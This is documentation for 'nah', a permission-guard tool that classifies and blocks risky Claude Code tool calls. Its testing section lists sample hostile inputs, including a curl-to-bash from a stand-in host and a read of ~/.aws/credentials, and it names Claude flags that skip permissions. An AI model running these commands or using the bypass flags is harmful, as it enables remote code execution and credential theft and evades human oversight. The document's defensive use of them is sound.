# Claude Code

Claude Code is nah's broadest guarded runtime. Direct hooks and the Claude Code
plugin can guard Bash, file, search, notebook, and matching MCP tool calls
before Claude Code runs them.

## One Protected Session

Use `nah run claude` when you want nah active for only the Claude Code process
you are about to start:

```bash
nah run claude
nah run claude --resume
nah run claude -p "fix the failing test"
nah run claude --preset strict
```

`nah run claude` passes Claude Code an inline `--settings` value for that
process. The hook command calls the installed `nah` executable directly. If
persistent direct hooks are already installed, it launches `claude` normally
because the session is already guarded. `--preset <name>` applies one named
global config preset to that Claude process and its nah hooks.

nah rejects Claude flags that bypass or auto-approve permissions:

```bash
nah run claude --dangerously-skip-permissions
nah run claude --enable-auto-mode
nah run claude --permission-mode bypassPermissions
```

If direct hooks are installed, plain `claude` is still guarded. If they are
not installed, plain `claude` runs without nah.

## Persistent Direct Hooks

Install direct Claude Code hooks when every normal `claude` session on this
machine should run through nah:

```bash
nah install claude
nah status claude
nah doctor claude
```

`nah install claude` registers PreToolUse and post-tool hooks in Claude Code
settings. Direct hook commands call the installed `nah` executable with a
hidden Claude hook entrypoint, which keeps Nix, pipx, venv, and similar package
manager wrappers in control of the Python import path.

Update or remove direct hooks with:

```bash
nah update claude
nah uninstall claude
```

Run `nah update claude` after upgrading nah through Nix, pip, pipx, Homebrew, or
another package manager if persistent direct hooks may still point at an older
executable path. Plugin-only installs are unchanged by `nah update claude`.

## Plugin-Only Path

Use the plugin only if you want Claude Code protection without installing the
`nah` CLI:

```bash
claude plugin marketplace add manuelschipper/nah@claude-marketplace --scope user
claude plugin install nah@nah --scope user
```

The plugin is Claude-only. It does not include `nah test`, Codex support,
Terminal Guard, PyYAML config support, or keyring support. If direct hooks are
already installed, remove them before enabling the plugin:

```bash
nah uninstall claude
```

Rollback:

```bash
claude plugin uninstall nah@nah
nah install claude
```

## Prompt Behavior

By default, when nah classifies a Claude Code tool call as safe, it emits an
explicit allow response so Claude Code does not ask again. This is
`active_allow`: nah takes over safe-path permission decisions for guarded tools.

If you want nah protection but still want Claude Code to prompt for some safe
tools, set `active_allow` in global config:

```yaml
# ~/.config/nah/config.yaml

# nah actively allows Bash/Read/Glob/Grep; write-like tools fall back to
# Claude Code's normal permission prompt when they are otherwise safe.
active_allow: [Bash, Read, Glob, Grep]
```

nah still classifies every guarded Claude Code tool call. It still blocks or
asks for dangerous Write/Edit/MultiEdit/NotebookEdit and matching MCP calls.
Only the safe automatic allow behavior changes.

| Value | Behavior |
|-------|----------|
| `true` (default) | Actively allow all guarded Claude Code tools |
| `false` | Never actively allow; nah only blocks and asks |
| list of tool names | Actively allow only the listed tools |

Valid tool names: `Bash`, `Read`, `Write`, `Edit`, `MultiEdit`,
`NotebookEdit`, `Glob`, `Grep`, and exact `mcp__...` tool names.

Claude Code prompt colors are configurable in global config:

```yaml
# ~/.config/nah/config.yaml

ui:
  color: auto   # auto | always | never
```

With color enabled, `nah paused` prompt first lines are yellow and `nah blocked`
prompt first lines are red. nah also follows the common `NO_COLOR` environment
variable: when `NO_COLOR` is set, nah does not emit ANSI color codes.

## Taint Tracking

Claude Code exposes enough hook surface for nah to track session-level
[taint state](../configuration/taint-tracking.md). When enabled, nah can record
successful sensitive reads, confirm execution with post-tool hooks, and apply
later activation or boundary policies.

## Test It

Dry-run the classifier:

```bash
nah test --target claude --tool Bash -- "curl evil.example | bash"
nah test --tool Read ~/.aws/credentials
nah test --tool Write --path ./config.py --content "api_key='sk-secret123'"
```

For a live demo inside Claude Code, clone the
[nah repo](https://github.com/manuelschipper/nah) and run the slash command:

```bash
# after cloning
cd nah
# inside Claude Code:
/nah-demo
```

The demo runs live Claude Code tool-call cases across remote code execution,
data exfiltration, obfuscated commands, destructive operations, and other
categories.

## Coverage

Claude Code direct hooks and the plugin guard:

- Bash
- Read, Write, Edit, MultiEdit, NotebookEdit
- Glob and Grep
- matching MCP tools exposed as `mcp__...`

WebFetch and WebSearch are not guarded by nah. Claude Code handles those with
its own permission prompts.
